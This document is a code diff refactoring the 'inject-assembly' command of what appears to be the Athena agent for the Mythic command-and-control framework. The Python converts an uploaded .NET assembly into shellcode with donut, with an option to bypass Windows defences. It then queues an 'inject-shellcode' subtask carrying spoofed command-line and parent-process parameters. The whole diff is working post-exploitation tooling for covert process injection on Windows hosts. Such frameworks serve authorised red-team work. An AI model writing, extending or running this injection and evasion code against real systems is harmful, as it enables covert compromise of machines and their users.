@@ -1,14 +1,12 @@
-from mythic_container.MythicCommandBase import *  # import the basics
-import json  # import any other code you might need
-# import the code for interacting with Files on the Mythic server
+from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+from .athena_utils.mythicrpc_utilities import *
+from .athena_utils.bof_utilities import *
 import donut
 import tempfile
 import base64
 import os
-
-from .athena_utils import message_converter
-
+import json
 # create a class that extends TaskArguments class that will supply all the arguments needed for this command
 class InjectAssemblyArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
@@ -155,73 +153,68 @@ class InjectAssemblyCommand(CommandBase):
         supported_os=[SupportedOS.Windows],
         builtin=False
     )
+    completion_functions = {"command_callback": default_coff_completion_callback}
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
             TaskID=taskData.Task.ID,
             Success=True,
         )
-#       Get original file info
-        fData = FileData()
-        fData.AgentFileId = taskData.args.get_arg("file")
-        file_rpc = await SendMythicRPCFileGetContent(fData)
-        
-        if not file_rpc.Success:
-            raise Exception("Failed to get file contents: " + file_rpc.Error)
 
-        #Create a temporary file
-        tempDir = tempfile.TemporaryDirectory()
+        # Retrieve and decode the file
+        file_contents = await get_mythic_file(taskData.args.get_arg("file"))
+        original_fileName = await get_mythic_file_name(taskData.args.get_arg("file"))
+        decoded_file_contents = base64.b64decode(file_contents)
 
-        with open(os.path.join(tempDir.name, "assembly.exe"), "wb") as file:
-            file.write(file_rpc.Content)
+        # Create a temporary directory and save the assembly file
+        with tempfile.TemporaryDirectory() as temp_dir:
+            assembly_path = os.path.join(temp_dir, "assembly.exe")
+            with open(assembly_path, "wb") as file:
+                file.write(decoded_file_contents)
 
-        donut_arch = 0
-        if taskData.args.get_arg("arch") == "AnyCPU":
-            donut_arch = 3
-        elif taskData.args.get_arg("arch") == "x64":
-            donut_arch = 2
-        elif taskData.args.get_arg("arch") == "x86":
-            donut_arch = 1
+            # Determine architecture for donut
+            arch_mapping = {"AnyCPU": 3, "x64": 2, "x86": 1}
+            donut_arch = arch_mapping.get(taskData.args.get_arg("arch"), 0)
 
-        shellcode = donut.create(
-            file=os.path.join(tempDir.name, "assembly.exe"),
-            arch = donut_arch,
-            bypass = taskData.args.get_arg("bypass"),
-            params = taskData.args.get_arg("arguments"),
-            exit_opt = taskData.args.get_arg("exit_opt"),
+            # Generate shellcode with donut
+            shellcode = donut.create(
+                file=assembly_path,
+                arch=donut_arch,
+                bypass=taskData.args.get_arg("bypass"),
+                params=taskData.args.get_arg("arguments"),
+                exit_opt=taskData.args.get_arg("exit_opt"),
+            )
+
+        # Create Mythic file for the shellcode
+        shellcode_file = await create_mythic_file(
+            taskData.Task.ID, shellcode, "shellcode.bin", delete_after_fetch=True
         )
 
-        fileCreate = MythicRPCFileCreateMessage(taskData.Task.ID, DeleteAfterFetch = True, FileContents = shellcode, Filename = "shellcode.bin")
+        # Create subtask
+        subtask_params = {
+            "file": shellcode_file.AgentFileId,
+            "commandline": taskData.args.get_arg("commandline"),
+            "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
+            "output": taskData.args.get_arg("output"),
+            "parent": taskData.args.get_arg("parent"),
+        }
+        subtask = await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                taskData.Task.ID,
+                CommandName="inject-shellcode",
+                SubtaskCallbackFunction="command_callback",
+                Params=json.dumps(subtask_params),
+                Token=taskData.Task.TokenID,
+            )
+        )
 
-        shellcodeFile = await SendMythicRPCFileCreate(fileCreate)
-
-        if not shellcodeFile.Success:
-            raise Exception("Failed to create file: " + shellcodeFile.Error)
-        
-        token = 0
-        createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(taskData.Task.ID, 
-                                                                CommandName="inject-shellcode", 
-                                                                Params=json.dumps(
-                                                                {   "file": shellcodeFile.AgentFileId, 
-                                                                    "commandline": taskData.args.get_arg("commandline"),
-                                                                    "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
-                                                                    "output": taskData.args.get_arg("output"),
-                                                                    "parent": taskData.args.get_arg("parent")}),
-                                                                Token=taskData.Task.TokenID)
-
-
-        subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)
-
+        # Handle subtask failure
         if not subtask.Success:
-            raise Exception("Failed to create subtask: " + subtask.Error)
-
+            raise Exception(f"Failed to create subtask: {subtask.Error}")
+        response.DisplayParams = f"{original_fileName} {taskData.args.get_arg('arguments')} into {taskData.args.get_arg('commandline').split(' ')[0]}"
         return response
 
-    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        if "message" in response:
-            user_output = response["message"]
-            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))
 
-        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
-        return resp
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        pass
 
